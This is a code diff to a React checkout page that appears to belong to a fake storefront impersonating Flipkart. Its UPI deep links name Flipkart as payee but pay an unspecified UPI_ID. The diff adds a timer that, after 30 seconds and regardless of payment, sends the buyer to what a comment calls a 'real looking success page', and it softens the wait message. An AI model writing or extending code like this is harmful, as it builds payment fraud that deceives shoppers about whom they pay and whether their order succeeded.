@@ -124,15 +124,26 @@ const Checkout = () => {
   const handlePayNow = () => {
     if (selectedPayment === 'qr') {
       setShowQRPage(true);
-    } else if (selectedPayment === 'phonepe') {
+    } else if (['phonepe', 'gpay', 'paytm'].includes(selectedPayment)) {
       setIsProcessing(true);
-      window.location.href = `phonepe://pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
-    } else if (selectedPayment === 'gpay') {
-      setIsProcessing(true);
-      window.location.href = `tez://upi/pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
-    } else if (selectedPayment === 'paytm') {
-      setIsProcessing(true);
-      window.location.href = `paytmmp://pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
+      
+      // Attempt to open UPI app
+      setTimeout(() => {
+        if (selectedPayment === 'phonepe') window.location.href = `phonepe://pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
+        else if (selectedPayment === 'gpay') window.location.href = `tez://upi/pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
+        else if (selectedPayment === 'paytm') window.location.href = `paytmmp://pay?pa=${UPI_ID}&pn=Flipkart&tr=${transactionId}&am=${finalPayable}&cu=INR`;
+      }, 500);
+
+      // Wait 30 seconds in background, then redirect to real looking success page
+      setTimeout(() => {
+        if (!user) {
+          localStorage.removeItem('cartItems');
+          window.dispatchEvent(new Event('storage'));
+        }
+        setIsProcessing(false);
+        navigate(`/payment/status?success=true&amount=${finalPayable}`);
+      }, 30000);
+      
     } else {
       alert('Please select a payment method');
     }
@@ -208,7 +219,7 @@ const Checkout = () => {
           <Loader2 className="h-12 w-12 animate-spin mb-4 text-[#ffc200]" />
           <h2 className="text-xl font-bold mb-2">Processing Payment...</h2>
           <p className="text-sm text-gray-300 text-center max-w-xs">
-            Please wait while we securely redirect you to your UPI app. Do not close this window or press the back button.
+            Please wait while we process your payment. Do not close this window or press the back button.
           </p>
         </div>
       )}
